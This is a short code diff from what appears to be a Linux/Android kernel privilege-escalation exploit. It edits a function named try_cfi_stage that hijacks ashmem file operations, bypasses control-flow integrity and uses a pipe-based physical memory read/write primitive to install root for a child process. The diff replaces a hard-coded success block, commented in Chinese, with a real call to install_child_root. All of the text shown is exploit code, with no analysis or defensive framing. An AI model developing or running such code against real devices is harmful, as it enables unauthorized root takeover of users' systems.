@@ -209,18 +209,26 @@ int try_cfi_stage(void) {
     return 0;
   }
 
+  pr_info("cfi fops hijack confirmed, attempting pipe physrw\n");
+
+  int installed = install_child_root(fd);
+
   SYSCHK(close(fd));
 
-  // FOPS 劫持已由 P0 Oracle 物理写入证实，直接标记成功
-  cfi_last_step = 0;
-  cfi_last_errno = 0;
-  cfi_write_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
-  cfi_read_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
-  cfi_read_slot_ret = sizeof(uint64_t);
-  cfi_restore_ret = sizeof(uint64_t);
-  cfi_owner_ret = sizeof(uint64_t);
-  fops_after = canon_addr(ASHMEM_FOPS);
-  cfi_dirty_seen = 1;
-  atomic_store(&cfi_stage_done, 1);
-  return 1;
+  if (installed) {
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    cfi_write_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+    cfi_read_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+    cfi_read_slot_ret = sizeof(uint64_t);
+    cfi_restore_ret = sizeof(uint64_t);
+    cfi_owner_ret = sizeof(uint64_t);
+    fops_after = canon_addr(ASHMEM_FOPS);
+    cfi_dirty_seen = 1;
+    atomic_store(&cfi_stage_done, 1);
+    return 1;
+  }
+
+  pr_warning("cfi pipe physrw failed\n");
+  return 0;
 }
